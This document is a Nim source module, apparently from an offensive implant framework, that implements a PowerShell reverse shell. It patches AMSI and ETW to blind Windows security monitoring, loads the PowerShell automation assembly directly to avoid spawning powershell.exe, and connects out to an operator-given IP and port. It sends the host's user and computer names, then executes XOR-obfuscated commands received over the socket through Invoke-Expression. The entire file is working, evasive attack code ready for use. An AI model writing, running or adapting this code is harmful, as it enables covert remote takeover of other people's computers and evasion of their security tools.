import winim/clr except `[]`
from strutils import parseInt, join, split, startsWith, toHex, parseHexInt
import ../../selfProtections/patches/[patchAMSI, patchETW]
import ../../util/strenc

# Execute a reverse PowerShell shell through referencing the System.Management.Automation
# assembly DLL directly without calling powershell.exe
proc reverseShell*(args : seq[string]) : string =
    # Check arguments
    if args.len < 2:
        result = obf("Invalid number of arguments received.")
        return

    var
        amsi: bool = true  # AMSI bypass enabled by default
        etw: bool = true   # ETW bypass enabled by default
        ip: string = ""
        port: string = ""
        xorKey: int = 0    # Must be provided as argument

    # Parse IP:PORT format
    let parts = args[0].split(':')
    if parts.len != 2:
        result = obf("Invalid command format.")
        return
    
    ip = parts[0]
    port = parts[1]

    # Parse XOR key (required)
    try:
        if args[1].startsWith("0x"):
            xorKey = cast[int](parseHexInt(args[1]))
        else:
            xorKey = parseInt(args[1])
            
        # Verify XOR key is valid (not zero)
        if xorKey == 0:
            result = obf("Invalid XOR key. Must be a non-zero number (decimal or hex with 0x prefix).")
            return
    except:
        result = obf("Invalid XOR key. Must be a number (decimal or hex with 0x prefix).")
        return

    result = obf("Creating connection...\n")
    if amsi:
        var res = patchAMSI.patchAMSI()
        if res == 0:
            result.add(obf("[+] AMSI patched!\n"))
        if res == 1:
            result.add(obf("[-] Error patching AMSI!\n"))
        if res == 2:
            result.add(obf("[+] AMSI already patched!\n"))
    if etw:
        var res = patchETW.patchETW()
        if res == 0:
            result.add(obf("[+] ETW patched!\n"))
        if res == 1:
            result.add(obf("[-] Error patching ETW!\n"))
        if res == 2:
            result.add(obf("[+] ETW already patched!\n"))
    
    try:
        # Load PowerShell assembly
        let Automation = load("System.Management.Automation")
        let RunspaceFactory = Automation.GetType("System.Management.Automation.Runspaces.RunspaceFactory")
        
        # Create runspace and pipeline
        var runspace = @RunspaceFactory.CreateRunspace()
        
        # Build the PowerShell command string for the reverse shell
        var psCommand = """
        try {
            $ErrorActionPreference = "Stop"
            $client = New-Object System.Net.Sockets.TCPClient('""" & ip & """', """ & port & """)
            $stream = $client.GetStream()
            
            # XOR key for encoding/decoding - make sure it's treated as a number
            [int]$xorKey = """ & $xorKey & """
            # Extract key bytes for clarity and consistent behavior
            $keyByte0 = ($xorKey -shr 24) -band 0xFF  # Most significant byte (byte 0)
            $keyByte1 = ($xorKey -shr 16) -band 0xFF  # byte 1
            $keyByte2 = ($xorKey -shr 8) -band 0xFF   # byte 2
            $keyByte3 = $xorKey -band 0xFF            # Least significant byte (byte 3)
            
            # Simple XOR encoding function using fixed key bytes order
            function XorEncode {
                param([string]$text)
                $bytes = [System.Text.Encoding]::ASCII.GetBytes($text)
                $result = New-Object byte[] $bytes.Length
                
                for($i=0; $i -lt $bytes.Length; $i++) {
                    # Use modulo to choose the right key byte in a fixed pattern
                    switch($i % 4) {
                        0 { $result[$i] = $bytes[$i] -bxor $keyByte0 }  # byte 0
                        1 { $result[$i] = $bytes[$i] -bxor $keyByte1 }  # byte 1
                        2 { $result[$i] = $bytes[$i] -bxor $keyByte2 }  # byte 2
                        3 { $result[$i] = $bytes[$i] -bxor $keyByte3 }  # byte 3
                    }
                }
                
                return [Convert]::ToBase64String($result)
            }
            
            # Simple XOR decoding function using fixed key bytes order
            function XorDecode {
                param([string]$encodedText)
                try {
                    $bytes = [Convert]::FromBase64String($encodedText)
                    $result = New-Object byte[] $bytes.Length
                    
                    for($i=0; $i -lt $bytes.Length; $i++) {
                        # Use modulo to choose the right key byte in a fixed pattern
                        switch($i % 4) {
                            0 { $result[$i] = $bytes[$i] -bxor $keyByte0 }  # byte 0
                            1 { $result[$i] = $bytes[$i] -bxor $keyByte1 }  # byte 1
                            2 { $result[$i] = $bytes[$i] -bxor $keyByte2 }  # byte 2
                            3 { $result[$i] = $bytes[$i] -bxor $keyByte3 }  # byte 3
                        }
                    }
                    
                    return [System.Text.Encoding]::ASCII.GetString($result)
                } catch {
                    return $encodedText
                }
            }
            
            # Send banner with system info
            $banner = "Windows PowerShell running as user $env:USERNAME on $env:COMPUTERNAME`nPS $($executionContext.SessionState.Path.CurrentLocation)> "
            $encodedBanner = XorEncode $banner
            $bytes = [System.Text.Encoding]::ASCII.GetBytes($encodedBanner + "`n")
            $stream.Write($bytes, 0, $bytes.Length)
            $stream.Flush()
            
            while($true) {
                # Read incoming command
                $buffer = New-Object byte[] 65536
                if (!$stream.DataAvailable) {
                    Start-Sleep -Milliseconds 100
                    continue
                }
                
                $read = $stream.Read($buffer, 0, $buffer.Length)
                if ($read -le 0) { continue }
                
                $encodedCommand = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $read).Trim()
                
                try {
                    $command = XorDecode $encodedCommand
                } catch {
                    # If decoding fails, try to recover
                    $command = $encodedCommand
                }
                
                # Exit command
                if ($command -eq "exit") {
                    break
                }
                
                # Execute command and capture output
                $output = ""
                try {
                    # First try to execute as scriptblock within this runspace
                    $result = Invoke-Expression $command 2>&1 | Out-String
                    if ([string]::IsNullOrEmpty($result)) {
                        $output = "[*] Command executed (no output)"
                    } else {
                        $output = $result
                    }
                } catch {
                    $output = "Error: " + $_.Exception.Message
                }
                
                # Append prompt to output
                $output = $output.Trim() + "`nPS $($executionContext.SessionState.Path.CurrentLocation)> "
                
                # Send encoded response
                $encodedOutput = XorEncode $output
                $responseBytes = [System.Text.Encoding]::ASCII.GetBytes($encodedOutput + "`n")
                $stream.Write($responseBytes, 0, $responseBytes.Length)
                $stream.Flush()
            }
        } catch {
            # Silent error handling
        } finally {
            if ($client -ne $null) {
                $client.Close()
            }
        }
        """
        
        # Execute PowerShell command in background
        runspace.Open()
        var pipeline = runspace.CreatePipeline()
        pipeline.Commands.AddScript(psCommand)
        discard pipeline.InvokeAsync()
        
        result.add(obf("[+] Connection started successfully.\n"))
            
    except Exception as e:
        result.add(obf("[-] Error creating connection: ") & getCurrentExceptionMsg() & "\n")